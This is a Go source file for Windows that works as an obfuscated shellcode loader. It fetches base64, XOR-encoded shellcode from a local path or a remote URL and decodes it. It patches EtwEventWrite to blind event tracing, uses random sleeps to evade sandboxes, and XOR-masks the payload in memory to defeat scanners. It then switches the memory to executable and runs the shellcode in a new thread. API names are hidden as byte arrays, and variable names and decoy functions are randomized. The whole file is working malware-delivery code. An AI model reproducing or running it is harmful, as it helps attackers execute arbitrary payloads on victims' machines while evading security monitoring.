package main

import (
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	oi4qhmucu03t = windows.NewLazySystemDLL(string([]byte{107,101,114,110,101,108,51,50,46,100,108,108}))
	z68yf5o1cn8zd = windows.NewLazySystemDLL(string([]byte{110,116,100,108,108,46,100,108,108}))

	proct4nnocwe94cau = z68yf5o1cn8zd.NewProc(string([]byte{82}) + string([]byte{116,108,77,111,118,101,77,101}) + string([]byte{109,111,114,121}))
)

func gxmpi5hc1ngc() int {
	x := 0
	for i := 0; i < 59; i++ {
		x += i * 9
	}
	return x
}

func r10w4f1g() int {
	ch := make(chan int, 1)
	ch <- 316
	return <-ch
}

func utyo0wrh() bool {
	return 817 > 371
}

func a6nzgs6() string {
	b := make([]byte, 19)
	for i := range b {
		b[i] = byte(76 + (i % 7))
	}
	return string(b)
}

func dl7wn09jf24e(err error, msg string) {
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] %s: %v\n", msg, err)
		os.Exit(1)
	}
}

func ig8dkvx() {
	g7egcntz4nj := z68yf5o1cn8zd.NewProc(string([]byte{69,116,119,69,118,101,110,116,87,114,105,116}) + string([]byte{101}))
	g7egcntz4nj.Find()
	patch := []byte{0xC3}
	var qj21r1v7fwp6o uint32
	vp := oi4qhmucu03t.NewProc(string([]byte{86,105}) + string([]byte{114,116,117,97,108}) + string([]byte{80,114,111,116,101,99}) + string([]byte{116}))
	vp.Call(g7egcntz4nj.Addr(), 1, 0x40, uintptr(unsafe.Pointer(&qj21r1v7fwp6o)))
	*(*byte)(unsafe.Pointer(g7egcntz4nj.Addr())) = patch[0]
	vp.Call(g7egcntz4nj.Addr(), 1, uintptr(qj21r1v7fwp6o), uintptr(unsafe.Pointer(&qj21r1v7fwp6o)))
}

func k3go88q9dd(url string) []byte {
	totaozmtu := &http.Client{}
	w8tkubb, err := totaozmtu.Get(url)
	dl7wn09jf24e(err, "download failed")
	defer w8tkubb.Body.Close()
	data, err := io.ReadAll(w8tkubb.Body)
	dl7wn09jf24e(err, "read failed")
	return data
}

func fd28812j80myy(p string) []byte {
	data, err := os.ReadFile(p)
	dl7wn09jf24e(err, "load failed")
	return data
}

func xm80mfxx4ktrc(data []byte) []byte {
	decoded, err := base64.StdEncoding.DecodeString(string(data))
	dl7wn09jf24e(err, "decode failed")
	if len(decoded) < 2 {
		fmt.Fprintf(os.Stderr, "[!] payload invalid\n")
		os.Exit(1)
	}
	// First byte is XOR key; remaining bytes are XOR-encrypted shellcode.
	v30qg7y41j := decoded[0]
	sc := make([]byte, len(decoded)-1)
	for i, b := range decoded[1:] {
		sc[i] = b ^ v30qg7y41j
	}
	return sc
}

func vqjn1ke4czvf0(pt4x7nj4 []byte) {
	ig8dkvx()

	// Timing jitter — sandbox evasion
	rz8in2k := time.Duration(rand.Intn(800)+200) * time.Millisecond
	time.Sleep(rz8in2k)

	// VirtualAlloc PAGE_READWRITE (no RWX signature)
	dldk37a, err := windows.VirtualAlloc(
		0,
		uintptr(len(pt4x7nj4)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	dl7wn09jf24e(err, "VirtualAlloc failed")

	// Copy shellcode into RW region
	proct4nnocwe94cau.Call(
		dldk37a,
		uintptr(unsafe.Pointer(&pt4x7nj4[0])),
		uintptr(len(pt4x7nj4)),
	)

	// XOR-encrypt shellcode in RW memory while sleeping.
	// Defeats MARS time-based memory scans — no recognisable bytes at rest.
	s8ubzea := byte(rand.Intn(254) + 1)
	for i := 0; i < len(pt4x7nj4); i++ {
		*(*byte)(unsafe.Pointer(dldk37a + uintptr(i))) ^= s8ubzea
	}
	time.Sleep(time.Duration(rand.Intn(3000)+2000) * time.Millisecond)
	for i := 0; i < len(pt4x7nj4); i++ {
		*(*byte)(unsafe.Pointer(dldk37a + uintptr(i))) ^= s8ubzea
	}

	// Flip to RX (execute, no write) — avoids RWX detection
	var qj21r1v7fwp6o uint32
	vp := oi4qhmucu03t.NewProc(string([]byte{86,105}) + string([]byte{114,116,117,97,108}) + string([]byte{80,114,111,116,101,99}) + string([]byte{116}))
	vp.Call(dldk37a, uintptr(len(pt4x7nj4)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&qj21r1v7fwp6o)))

	// CreateThread with 32MB stack + WaitForSingleObject
	ukl0afhhoe, _, err := oi4qhmucu03t.NewProc(string([]byte{67,114,101}) + string([]byte{97,116}) + string([]byte{101,84,104,114,101,97,100})).Call(0, 33554432, dldk37a, 0, 0x00010000, 0)
	if ukl0afhhoe == 0 {
		dl7wn09jf24e(err, "CreateThread failed")
	}
	oi4qhmucu03t.NewProc(string([]byte{87,97,105,116,70,111,114,83,105,110,103,108,101,79,98}) + string([]byte{106,101,99,116})).Call(ukl0afhhoe, 0xFFFFFFFF)
}

func main() {
	ywlosotffo1q := flag.String("local", "", "Path to local base64-encoded shellcode file")
	o60rnhn := flag.String("remote", "", "URL to remote base64-encoded shellcode file")
	flag.Parse()

	var oh4trzinccjl4 []byte

	if *ywlosotffo1q != "" {
		oh4trzinccjl4 = fd28812j80myy(*ywlosotffo1q)
	} else if *o60rnhn != "" {
		oh4trzinccjl4 = k3go88q9dd(*o60rnhn)
	} else {
		fmt.Println("[!] Usage: -local <path> | -remote <url>")
		os.Exit(1)
	}

	odju0thg6q797 := xm80mfxx4ktrc(oh4trzinccjl4)
	fmt.Println("[+] Shellcode decoded. Executing...")
	vqjn1ke4czvf0(odju0thg6q797)
}
